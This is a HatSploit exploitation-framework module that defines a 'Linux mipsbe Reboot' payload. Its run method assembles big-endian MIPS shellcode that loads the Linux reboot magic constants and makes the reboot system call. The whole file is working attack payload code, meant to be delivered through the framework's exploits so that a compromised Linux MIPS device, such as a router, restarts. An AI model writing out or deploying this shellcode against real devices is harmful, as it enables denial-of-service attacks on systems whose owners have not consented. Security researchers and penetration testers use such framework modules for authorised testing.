"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pex.assembler import Assembler

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload, Assembler):
    details = {
        'Name': "Linux mipsbe Reboot",
        'Payload': "linux/mipsbe/reboot",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer',
        ],
        'Description': "Reboot payload for Linux mipsbe.",
        'Architecture': "mipsbe",
        'Platform': "linux",
        'Rank': "low",
        'Type': "one_side",
    }

    def run(self):
        return self.assemble(
            self.details['Architecture'],
            """
            start:
                lui $a2, 0x4321
                ori $a2, $a2, 0xfedc
                lui $a1, 0x2812
                ori $a1, $a1, 0x1969
                lui $a0, 0xfee1
                ori $a0, $a0, 0xdead
                addiu $v0, $zero, 0xff8
                syscall 0x40404
            """,
        )
